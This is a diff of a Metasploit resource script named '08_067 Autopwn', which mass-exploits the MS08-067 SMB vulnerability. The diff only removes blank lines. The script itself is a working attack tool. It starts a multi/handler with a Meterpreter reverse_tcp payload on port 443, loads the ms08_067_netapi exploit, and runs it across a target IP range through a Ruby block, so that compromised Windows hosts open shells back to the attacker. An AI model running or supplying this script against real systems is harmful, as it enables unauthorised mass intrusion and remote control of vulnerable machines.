@@ -2,12 +2,10 @@
 # 08_067 Autopwn - Purpose of this script is to quickly spam multiple IPs very quickly with 08_067
 # Modified similar script from from @mubix - awesome dude, very smart guy, check out his blog
 
-
 # Let's setup the handler pick our payload
 
 use multi/handler
 setg PAYLOAD windows/meterpreter/reverse_tcp
-
 
 # Set the IP range and port globally
 # Obviously, modify the LHOST value and LPORT if you wish
@@ -17,12 +15,10 @@ setg LPORT 443
 set ExitOnSession false
 exploit -j -z
 
-
 # Now, let's pick our exploit
 
 use exploit/windows/smb/ms08_067_netapi
 set DisablePayloadHandler true
-
 
 # Let's setup our targets
 # Modify the RHOSTS value for a single IP or CIDR notation of your targets
@@ -38,4 +34,3 @@ self.run_single("exploit -j -z")
 
 end
 </ruby>
-
